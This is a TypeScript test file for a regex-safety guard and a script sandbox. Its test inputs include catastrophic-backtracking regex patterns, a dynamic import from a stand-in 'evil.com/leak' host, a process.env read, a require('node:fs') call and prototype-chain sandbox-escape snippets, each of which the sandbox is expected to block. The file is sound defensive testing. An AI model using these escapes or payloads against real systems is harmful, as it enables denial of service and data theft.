/**
 * @file tests/security-sandbox-and-redos.node.test.ts
 * @description
 *   Unit tests verifying security boundaries:
 *   1. ReDoS pattern detection (nested quantifiers, non-capturing group quantified alternations)
 *   2. Sandbox code isolation (preventing prototype breakout, blocking import(), require(), process)
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { isUnsafeRegexPattern } from '../src/engine/regex-safety.ts';
import { runSandboxedScript, evaluateSandboxedCondition } from '../src/engine/sandbox-executor.ts';

describe('Security: ReDoS Regex Safety Guard', () => {
  it('blocks quantified alternations with non-capturing prefix (?:a|a?)+$', () => {
    assert.strictEqual(isUnsafeRegexPattern('(?:a|a?)+$'), true);
    assert.strictEqual(isUnsafeRegexPattern('(?:a|a?)+b'), true);
    assert.strictEqual(isUnsafeRegexPattern('(?i:a|a?)+'), true);
  });

  it('blocks classic catastrophic backtracking patterns', () => {
    assert.strictEqual(isUnsafeRegexPattern('(a|a)+$'), true);
    assert.strictEqual(isUnsafeRegexPattern('(a|aa)+'), true);
    assert.strictEqual(isUnsafeRegexPattern('(a+)+'), true);
    assert.strictEqual(isUnsafeRegexPattern('(a*)*'), true);
    assert.strictEqual(isUnsafeRegexPattern('(?:a+)+'), true);
  });

  it('permits safe production regular expressions', () => {
    assert.strictEqual(isUnsafeRegexPattern('^https?://[a-zA-Z0-9.-]+'), false);
    assert.strictEqual(isUnsafeRegexPattern('\\d{4}-\\d{2}-\\d{2}'), false);
    assert.strictEqual(isUnsafeRegexPattern('(red|blue|green)'), false);
    assert.strictEqual(isUnsafeRegexPattern('^(apple|banana|cherry)$'), false);
    assert.strictEqual(isUnsafeRegexPattern('^[a-zA-Z0-9_-]+$'), false);
  });
});

describe('Security: Sandbox Code Execution Boundary', () => {
  it('blocks dynamic import() syntax', async () => {
    await assert.rejects(
      async () => {
        await runSandboxedScript("return import('https://evil.com/leak')", {});
      },
      (err: Error) => {
        assert.match(err.message, /\[沙箱安全拦截\]/);
        return true;
      },
    );
  });

  it('blocks direct process object access', async () => {
    await assert.rejects(
      async () => {
        await runSandboxedScript('return process.env', {});
      },
      (err: Error) => {
        assert.match(err.message, /\[沙箱安全拦截\]/);
        return true;
      },
    );
  });

  it('blocks require() invocations', async () => {
    await assert.rejects(
      async () => {
        await runSandboxedScript("return require('node:fs')", {});
      },
      (err: Error) => {
        assert.match(err.message, /\[沙箱安全拦截\]/);
        return true;
      },
    );
  });

  it('blocks host escape via setTimeout.constructor or Function string compilation', async () => {
    await assert.rejects(
      async () => {
        // Attempting to evaluate strings via constructor
        const script = `
          const fn = setTimeout.constructor("return 123");
          return fn();
        `;
        await runSandboxedScript(script, {});
      },
      (err: Error) => {
        // Must either fail on disallowed code generation or have no host access
        return /disallowed|not a function|Code generation/i.test(err.message);
      },
    );
  });

  it('blocks prototype chain breakout via this.constructor.constructor', async () => {
    await assert.rejects(
      async () => {
        const script = `
          const hostFn = (function() { return this.constructor.constructor; })();
          return hostFn("return 456")();
        `;
        await runSandboxedScript(script, {});
      },
      (err: Error) => {
        return /disallowed|not a function|Code generation|Cannot read properties/i.test(err.message);
      },
    );
  });

  it('executes legitimate safe computations and logging', async () => {
    const res = await runSandboxedScript(
      'console.log("computing sum"); return { total: inputs.a + inputs.b };',
      { a: 10, b: 25 },
    );
    assert.deepStrictEqual(res.result, { total: 35 });
    assert.match(res.stdout, /computing sum/);
  });

  it('evaluates safe boolean condition expressions', async () => {
    const cond = await evaluateSandboxedCondition('inputs.score >= 80', { score: 95 });
    assert.strictEqual(cond.isTruthy, true);

    const condFalse = await evaluateSandboxedCondition('inputs.score < 50', { score: 95 });
    assert.strictEqual(condFalse.isTruthy, false);
  });
});

